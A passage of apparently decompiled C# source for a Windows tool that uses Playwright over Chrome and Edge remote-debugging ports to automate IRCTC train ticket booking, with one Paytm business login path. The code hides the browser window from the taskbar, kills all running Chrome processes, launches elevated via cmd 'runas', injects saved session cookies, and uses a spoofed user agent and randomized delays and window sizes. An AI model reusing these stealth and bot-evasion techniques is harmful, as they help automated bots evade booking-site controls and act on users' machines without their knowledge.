                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }

    internal IPage StartEdgeAndConnect_NOCOKK(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldEdgeByProfile(userDataDir00);
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = "EdgeProfiles";
                    string path2 = Path.Combine(tempPath, path);
                    string text = "Profile_";
                    Guid guid = Guid.NewGuid();
                    string text2 = "N";
                    userDataDir00 = Path.Combine(path2, text + guid.ToString(text2));
                    userDataDir00 = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetEdgePath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + edgePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = edgePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                IPage page2 = page;
                string url = "https://dashboard.paytm.com/login/?referrer=Business&_gl=1*130vw70*_gcl_au*Mzc0MTcyMDY0LjE3ODE1MzgyNzc.*_ga*MTkyMjcwMTg1OC4xNzgxNTM4Mjc0*_ga_LSKTYTR270*czE3ODQ1MzQ4MjIkbzQkZzAkdDE3ODQ1MzQ4MjIkajYwJGwwJGgw";
                var response = page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                if (response != null)
                {
                    string finalUrl = response.Url;
                    int statusCode = response.Status;

                    Console.WriteLine("URL : " + finalUrl);
                    Console.WriteLine("Status : " + statusCode);
                }
                string html = page2.ContentAsync().GetAwaiter().GetResult();
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }
    private void KillAllcHROMEProcesses()
    {
        try
        {
            Process[] processes = Process.GetProcessesByName("chrome");
            foreach (Process proc in processes)
            {
                try
                {
                    int pid = proc.Id;

                    proc.Kill();
                    proc.WaitForExit(2000);

                    Console.WriteLine($"[Success] Brave Process (PID: {pid}) killed.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Kill Error] PID {proc.Id}: {ex.Message}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Cleanup Error]: " + ex.ToString());
        }
    }

    private void KillOldChromeByProfile(string profilePath)
    {
        if (string.IsNullOrEmpty(profilePath))
            return;

        try
        {
            Console.WriteLine("[Cleanup] " + profilePath + " wali profile ko close kar rahe hain...");

            string queryString =
                "SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name='chrome.exe'";

            using (ManagementObjectSearcher searcher =
                   new ManagementObjectSearcher(queryString))
            {
                foreach (ManagementObject item in searcher.Get())
                {
                    string commandLine =
                        item["CommandLine"]?.ToString() ?? "";

                    if (commandLine.IndexOf(profilePath,
                        StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        int pid = Convert.ToInt32(item["ProcessId"]);

                        try
                        {
                            Process proc = Process.GetProcessById(pid);

                            proc.Kill();
                            proc.WaitForExit(1000);

                            Console.WriteLine(
                                $"[Success] Chrome Process (PID: {pid}) killed.");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(
                                $"[Kill Error] PID {pid}: {ex.Message}");
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Cleanup Error]: " + ex.ToString());
        }
    }
    internal IPage StartChromeAndConnect_NEW_BETA(ref string userDataDir, string directlogin, Rectangle rect, string tktname, ref IPage page)
    {
        Random random = new Random();
        Process process = null;
        for (int i = 1; i <= 3; i++)
        {
            try
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                if (string.IsNullOrWhiteSpace(folderPath))
                {
                    throw new Exception("LocalAppData directory nahi mili.");
                }
                string text = Path.Combine(folderPath, tktname, "Temp", "2");
                text = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(text);
                if (!Directory.Exists(text))
                {
                    throw new Exception("Playwright TEMP directory create nahi hui:\r\n" + text);
                }
                Environment.SetEnvironmentVariable("TEMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TEMP", text);
                Environment.SetEnvironmentVariable("TMP", text);
                string browserPath = GetBrowserPath(TargetBrowser.Chrome);
                if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
                {
                    throw new Exception("Chrome executable nahi mila:\r\n\r\n" + browserPath);
                }
                int freeTcpPort = GetFreeTcpPort();
                if (string.IsNullOrWhiteSpace(userDataDir))
                {
                    userDataDir = Path.Combine(folderPath, tktname, "IRCTCChromeProfile");
                    Directory.CreateDirectory(userDataDir);
                }
                else
                {
                    Directory.CreateDirectory(userDataDir);
                    try
                    {
                        KillOldBrowserByProfile(userDataDir, TargetBrowser.Chrome);
                    }
                    catch
                    {
                    }
                }
                try
                {
                    KillAllcHROMEProcesses();
                }
                catch
                {
                }
                DisableEdgePasswordManager(userDataDir);
                Thread.Sleep(1500);
                page = null;
                string arguments = "--remote-debugging-port=" + freeTcpPort + " --remote-debugging-address=127.0.0.1 --user-data-dir=\"" + userDataDir + "\" --no-first-run --no-default-browser-check --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --app=https://www.irctc.co.in/nget/train-search--disable-features=msEdgeSync --password-store=basic --window-position=" + rect.X + "," + rect.Y;
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.FileName = browserPath;
                processStartInfo.Arguments = arguments;
                processStartInfo.UseShellExecute = false;
                processStartInfo.CreateNoWindow = false;
                processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                process = Process.Start(processStartInfo);
                if (process == null)
                {
                    throw new Exception("Chrome process start nahi hua.");
                }
                bool flag = false;
                int num = 30;
                for (int j = 0; j < num; j++)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        Task task = tcpClient.ConnectAsync("127.0.0.1", freeTcpPort);
                        if (task.Wait(TimeSpan.FromSeconds(1.0)) && tcpClient.Connected)
                        {
                            flag = true;
                            break;
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(500);
                }
                if (!flag)
                {
                    throw new Exception("Chrome CDP port available nahi hua.\r\n\r\nPort: " + freeTcpPort);
                }
                IPlaywright result = Playwright.CreateAsync().GetAwaiter().GetResult();
                if (result == null)
                {
                    throw new Exception("Playwright create nahi hua.");
                }
                IBrowser result2 = result.Chromium.ConnectOverCDPAsync("http://127.0.0.1:" + freeTcpPort, (BrowserTypeConnectOverCDPOptions)null).GetAwaiter().GetResult();
                if (result2 == null)
                {
                    throw new Exception("Chrome CDP se connect nahi hua.");
                }
                IBrowserContext val = null;
                if (result2.Contexts != null && result2.Contexts.Count > 0)
                {
                    val = result2.Contexts[0];
                }
                if (val == null)
                {
                    val = result2.NewContextAsync(new BrowserNewContextOptions
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
                    }).GetAwaiter().GetResult();
                }
                if (val == null)
                {
                    throw new Exception("Browser context nahi mila.");
                }
                if (val.Pages != null && val.Pages.Count > 0)
                {
                    page = val.Pages.FirstOrDefault();
                }
                if (page == null)
                {
                    page = val.NewPageAsync().GetAwaiter().GetResult();
                }
                if (page == null)
                {
                    throw new Exception("Playwright page create nahi hua.");
                }
                try
                {
                    IntPtr intPtr = EdgeTaskbarHider.FindChromeWindowByUserDataDir(userDataDir);
                    if (intPtr != IntPtr.Zero)
                    {
                        EdgeTaskbarHider.HideFromTaskbar(intPtr);
                    }
                }
                catch
                {
                }
                try
                {
                    ICDPSession result3 = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    if (result3 != null)
                    {
                        JsonElement? result4 = result3.SendAsync("Browser.getWindowForTarget", (Dictionary<string, object>)null).GetAwaiter().GetResult();
                        if (result4.HasValue)
                        {
                            JsonElement value2 = result4.Value;
                            string propertyName = "windowId";
                            int @int = value2.GetProperty(propertyName).GetInt32();
                            int num3 = random.Next(1, 20);
                            int width = rect.Width;
                            int num4 = rect.Height - num3;
                            int x = rect.X;
                            int y = rect.Y;
                            Dictionary<string, object> dictionary = new Dictionary<string, object>();
                            string key = "windowId";
                            dictionary.Add(key, @int);
                            string key2 = "bounds";
                            Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                            string key3 = "left";
                            dictionary2.Add(key3, x);
                            string key4 = "top";
                            dictionary2.Add(key4, y);
                            string key5 = "width";
                            dictionary2.Add(key5, width);
                            string key6 = "height";
                            dictionary2.Add(key6, num4);
                            string key7 = "windowState";
                            string value3 = "normal";
                            dictionary2.Add(key7, value3);
                            dictionary.Add(key2, dictionary2);
                            Dictionary<string, object> args = dictionary;
                            string method2 = "Browser.setWindowBounds";
                            result3.SendAsync(method2, args).GetAwaiter().GetResult();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Window bounds error: " + ex.ToString());
                }
                if (!string.Equals(directlogin, "True", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        LoadCookiesFromJsonToBrowserChrome(val);
                    }
                    catch (Exception ex2)
                    {
                        Console.WriteLine("Cookie load error: " + ex2.ToString());
                    }
                }
                try
                {
                    CaptureIRCTCRequests(page);
                }
                catch (Exception ex3)
                {
                    Console.WriteLine("Request capture error: " + ex3.ToString());
                }
                IResponse val2 = null;
                try
                {
                    val2 = page.GotoAsync("https://www.irctc.co.in/eticket/train-search", new PageGotoOptions
                    {
                        WaitUntil = (WaitUntilState)1,
                        Timeout = 45000f
                    }).GetAwaiter().GetResult();
                }
                catch (PlaywrightException val3)
                {
                    PlaywrightException val4 = val3;
                    Console.WriteLine("IRCTC Goto warning: " + ((Exception)(object)val4).Message);
                }
                catch (TimeoutException ex4)
                {
                    Console.WriteLine("IRCTC navigation timeout: " + ex4.Message);
                }
                Thread.Sleep(random.Next(3000, 5000));
                if (val2 != null)
                {
                    try
                    {
                        Console.WriteLine("URL: " + val2.Url);
                        Console.WriteLine("Status: " + val2.Status);
                    }
                    catch
                    {
                    }
                }
                string text2 = "";
                try
                {
                    text2 = page.ContentAsync().GetAwaiter().GetResult();
                }
                catch (Exception ex5)
                {
                    Console.WriteLine("Page content error: " + ex5.Message);
                }
                string text3 = (text2 ?? "").ToLowerInvariant();
                if (text3.Contains("we are experiencing high load"))
                {
                    Console.WriteLine("IRCTC High Load. Retry " + i + "/" + 3);
                    try
                    {
                        if (process != null && !process.HasExited)
                        {
                            process.Kill();
                            process.WaitForExit(5000);
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(random.Next(15000, 30000));
                    continue;
                }
                bool flag2 = text3.Contains("book train tickets online instantly on irctc");
                bool flag3 = false;
                if (flag2 || flag3)
                {
                    BrowserLoded = true;
                    return page;
                }
                Console.WriteLine("Unexpected IRCTC page. Retry " + i + "/" + 3);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch
                {
                }
                Thread.Sleep(random.Next(5000, 10000));
            }
            catch (Exception ex6)
            {
                Console.WriteLine("Attempt " + i + " failed:");
                Console.WriteLine(ex6.ToString());
                MessageBox.Show("Attempt " + i + " failed:\r\n\r\n" + ex6.Message, "Chrome / Playwright Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch (Exception ex7)
                {
                    Console.WriteLine("Chrome cleanup error: " + ex7.Message);
                }
                process = null;
                page = null;
                if (i < 3)
                {
                    Thread.Sleep(random.Next(3000, 7000));
                }
            }
        }
        BrowserLoded = false;
        throw new Exception("Unable to start Chrome and connect after maximum retries.");
    }

    internal IPage StartChromeAndConnect_NEW(ref string userDataDir, string directlogin, Rectangle rect, string tktname, ref IPage page)
    {
        Random random = new Random();
        Process process = null;
        for (int i = 1; i <= 3; i++)
        {
            try
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                if (string.IsNullOrWhiteSpace(folderPath))
                {
                    throw new Exception("LocalAppData directory nahi mili.");
                }
                string text = Path.Combine(folderPath, tktname, "Temp", "2");
                text = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(text);
                if (!Directory.Exists(text))
                {
                    throw new Exception("Playwright TEMP directory create nahi hui:\r\n" + text);
                }
                Environment.SetEnvironmentVariable("TEMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TEMP", text);
                Environment.SetEnvironmentVariable("TMP", text);
                string browserPath = GetBrowserPath(TargetBrowser.Chrome);
                if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
                {
                    throw new Exception("Chrome executable nahi mila:\r\n\r\n" + browserPath);
                }
                int freeTcpPort = GetFreeTcpPort();
                if (string.IsNullOrWhiteSpace(userDataDir))
                {
                    userDataDir = Path.Combine(folderPath, tktname, "IRCTCChromeProfile");
                    Directory.CreateDirectory(userDataDir);
                }
                else
                {
                    Directory.CreateDirectory(userDataDir);
                    try
                    {
                        KillOldBrowserByProfile(userDataDir, TargetBrowser.Chrome);
                    }
                    catch
                    {
                    }
                }
                try
                {
                    KillAllcHROMEProcesses();
                }
                catch
                {
                }
                DisableEdgePasswordManager(userDataDir);
                Thread.Sleep(1500);
                page = null;
                string arguments = "--remote-debugging-port=" + freeTcpPort + " --remote-debugging-address=127.0.0.1 --user-data-dir=\"" + userDataDir + "\" --no-first-run --no-default-browser-check --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --app=https://www.irctc.co.in/nget/train-search--disable-features=msEdgeSync --password-store=basic --window-position=" + rect.X + "," + rect.Y;
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.FileName = browserPath;
                processStartInfo.Arguments = arguments;
                processStartInfo.UseShellExecute = false;
                processStartInfo.CreateNoWindow = false;
                processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                process = Process.Start(processStartInfo);
                if (process == null)
                {
                    throw new Exception("Chrome process start nahi hua.");
                }
                bool flag = false;
                int num = 30;
                for (int j = 0; j < num; j++)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        Task task = tcpClient.ConnectAsync("127.0.0.1", freeTcpPort);
                        if (task.Wait(TimeSpan.FromSeconds(1.0)) && tcpClient.Connected)
                        {
                            flag = true;
                            break;
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(500);
                }
                if (!flag)
                {
                    throw new Exception("Chrome CDP port available nahi hua.\r\n\r\nPort: " + freeTcpPort);
                }
                IPlaywright result = Playwright.CreateAsync().GetAwaiter().GetResult();
                if (result == null)
                {
                    throw new Exception("Playwright create nahi hua.");
                }
                IBrowser result2 = result.Chromium.ConnectOverCDPAsync("http://127.0.0.1:" + freeTcpPort, (BrowserTypeConnectOverCDPOptions)null).GetAwaiter().GetResult();
                if (result2 == null)
                {
                    throw new Exception("Chrome CDP se connect nahi hua.");
                }
                IBrowserContext val = null;
                if (result2.Contexts != null && result2.Contexts.Count > 0)
                {
                    val = result2.Contexts[0];
                }
                if (val == null)
                {
                    val = result2.NewContextAsync(new BrowserNewContextOptions
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
                    }).GetAwaiter().GetResult();
                }
                if (val == null)
                {
                    throw new Exception("Browser context nahi mila.");
                }
                if (val.Pages != null && val.Pages.Count > 0)
                {
                    page = val.Pages.FirstOrDefault();
                }
                if (page == null)
                {
                    page = val.NewPageAsync().GetAwaiter().GetResult();
                }
                if (page == null)
                {
                    throw new Exception("Playwright page create nahi hua.");
                }
                try
                {
                    IntPtr intPtr = EdgeTaskbarHider.FindChromeWindowByUserDataDir(userDataDir);
                    if (intPtr != IntPtr.Zero)
                    {
                        EdgeTaskbarHider.HideFromTaskbar(intPtr);
                    }
                }
                catch
                {
                }
                try
                {
                    ICDPSession result3 = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    if (result3 != null)
                    {
                        JsonElement? result4 = result3.SendAsync("Browser.getWindowForTarget", (Dictionary<string, object>)null).GetAwaiter().GetResult();
                        if (result4.HasValue)
                        {
                            JsonElement value2 = result4.Value;
                            string propertyName = "windowId";
                            int @int = value2.GetProperty(propertyName).GetInt32();
                            int num3 = random.Next(1, 20);
                            int width = rect.Width;
                            int num4 = rect.Height - num3;
                            int x = rect.X;
                            int y = rect.Y;
                            Dictionary<string, object> dictionary = new Dictionary<string, object>();
                            string key = "windowId";
                            dictionary.Add(key, @int);
                            string key2 = "bounds";
                            Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                            string key3 = "left";
                            dictionary2.Add(key3, x);
                            string key4 = "top";
                            dictionary2.Add(key4, y);
                            string key5 = "width";
                            dictionary2.Add(key5, width);
                            string key6 = "height";
                            dictionary2.Add(key6, num4);
                            string key7 = "windowState";
                            string value3 = "normal";
                            dictionary2.Add(key7, value3);
                            dictionary.Add(key2, dictionary2);
                            Dictionary<string, object> args = dictionary;
                            string method2 = "Browser.setWindowBounds";
                            result3.SendAsync(method2, args).GetAwaiter().GetResult();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Window bounds error: " + ex.ToString());
                }
                if (!string.Equals(directlogin, "True", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        LoadCookiesFromJsonToBrowserChrome(val);
                    }
                    catch (Exception ex2)
                    {
                        Console.WriteLine("Cookie load error: " + ex2.ToString());
                    }
                }
                try
                {
                    CaptureIRCTCRequests(page);
                }
                catch (Exception ex3)
                {
                    Console.WriteLine("Request capture error: " + ex3.ToString());
                }
                IResponse val2 = null;
                try
                {
                    val2 = page.GotoAsync("https://www.irctc.co.in/nget/train-search", new PageGotoOptions
                    {
                        WaitUntil = (WaitUntilState)1,
                        Timeout = 45000f
                    }).GetAwaiter().GetResult();
                }
                catch (PlaywrightException val3)
                {
                    PlaywrightException val4 = val3;
                    Console.WriteLine("IRCTC Goto warning: " + ((Exception)(object)val4).Message);
                }
                catch (TimeoutException ex4)
                {
                    Console.WriteLine("IRCTC navigation timeout: " + ex4.Message);
                }
                Thread.Sleep(random.Next(3000, 5000));
                if (val2 != null)
                {
                    try
                    {
                        Console.WriteLine("URL: " + val2.Url);
                        Console.WriteLine("Status: " + val2.Status);
                    }
                    catch
                    {
                    }
                }
                string text2 = "";
                try
                {
                    text2 = page.ContentAsync().GetAwaiter().GetResult();
                }
                catch (Exception ex5)
                {
                    Console.WriteLine("Page content error: " + ex5.Message);
                }
                string text3 = (text2 ?? "").ToLowerInvariant();
                if (text3.Contains("we are experiencing high load"))
                {
                    Console.WriteLine("IRCTC High Load. Retry " + i + "/" + 3);
                    try
                    {
                        if (process != null && !process.HasExited)
                        {
                            process.Kill();
                            process.WaitForExit(5000);
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(random.Next(15000, 30000));
                    continue;
                }
                bool flag2 = text3.Contains("book train tickets online instantly on irctc");
                bool flag3 = false;
                if (flag2 || flag3)
                {
                    BrowserLoded = true;
                    return page;
                }
                Console.WriteLine("Unexpected IRCTC page. Retry " + i + "/" + 3);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch
                {
                }
                Thread.Sleep(random.Next(5000, 10000));
            }
            catch (Exception ex6)
            {
                Console.WriteLine("Attempt " + i + " failed:");
                Console.WriteLine(ex6.ToString());
                MessageBox.Show("Attempt " + i + " failed:\r\n\r\n" + ex6.Message, "Chrome / Playwright Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch (Exception ex7)
                {
                    Console.WriteLine("Chrome cleanup error: " + ex7.Message);
                }
                process = null;
                page = null;
                if (i < 3)
                {
                    Thread.Sleep(random.Next(3000, 7000));
                }
            }
        }
        BrowserLoded = false;
        throw new Exception("Unable to start Chrome and connect after maximum retries.");
    }
    internal IPage StartChromeAndConnect(ref string userDataDir, string directlogin, Rectangle rect, ref IPage page)
    {
        const int maxRetry = 3;
        Random random = new Random();
        int num = 0;
        Process process = null;
        for (int attempt = 1; attempt <= maxRetry; attempt++)
        {
            Process chromeProcess = null;
            try
            {
                string chromePath = GetBrowserPath(TargetBrowser.Chrome);
                int debugPort = GetFreeTcpPort();
                if (string.IsNullOrWhiteSpace(userDataDir))
                {
                    userDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IRCTCChromeProfile");
                    Directory.CreateDirectory(userDataDir);
                }
                else
                {
                    KillOldBrowserByProfile(userDataDir, TargetBrowser.Chrome);
                }
                KillAllcHROMEProcesses();
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetEdgePath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, debugPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir;
                DisableEdgePasswordManager(userDataDir);
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/train-search";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + chromePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = chromePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                bool connected = false;
                for (int i = 0; i < 10; i++)
                {
                    try
                    {
                        using TcpClient client = new TcpClient();

                        client.Connect("127.0.0.1", debugPort);

                        connected = true;
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                    }
                }

                if (!connected)
                    throw new Exception("Chrome CDP port not available.");

                var playwright = Playwright.CreateAsync().GetAwaiter().GetResult();
                var browser = playwright.Chromium.ConnectOverCDPAsync($"http://127.0.0.1:{debugPort}").GetAwaiter().GetResult();
                IBrowserContext context;
                if (browser.Contexts.Any())
                {
                    context = browser.Contexts[0];
                }
                else
                {
                    context = browser
                        .NewContextAsync(new BrowserNewContextOptions
                        {
                            UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                                "AppleWebKit/537.36 (KHTML, like Gecko) " +
                                "Chrome/137.0.0.0 Safari/537.36"
                        })
                        .GetAwaiter()
                        .GetResult();
                }
                page = context.Pages.FirstOrDefault();
                if (page == null)
                {
                    page = context.NewPageAsync()
                        .GetAwaiter()
                        .GetResult();
                }
                IntPtr hwnd = EdgeTaskbarHider.FindChromeWindowByUserDataDir(userDataDir);
                if (hwnd != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(hwnd);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowserChrome(context);
                }
                CaptureIRCTCRequests(page);

                Thread.Sleep(random.Next(2000, 4000));

                var responsePage = page.GotoAsync(
                    "https://www.irctc.co.in/nget/train-search",
                    new PageGotoOptions
                    {
                        WaitUntil = WaitUntilState.Load,
                        Timeout = 120000
                    })
                    .GetAwaiter()
                    .GetResult();

                Thread.Sleep(random.Next(3000, 6000));

                if (responsePage != null)
                {
                    Console.WriteLine(
                        $"URL: {responsePage.Url}");

                    Console.WriteLine(
                        $"Status: {responsePage.Status}");
                }

                string html = page.ContentAsync().GetAwaiter().GetResult();

                string htmlLower = html.ToLowerInvariant();

                if (htmlLower.Contains(
                        "we are experiencing high load"))
                {
                    Console.WriteLine(
                        $"IRCTC High Load. Retry {attempt}/{maxRetry}");

                    Thread.Sleep(random.Next(15000, 30000));

                    continue;
                }

                if (!htmlLower.Contains(
                        "book train tickets online instantly on irctc"))
                {
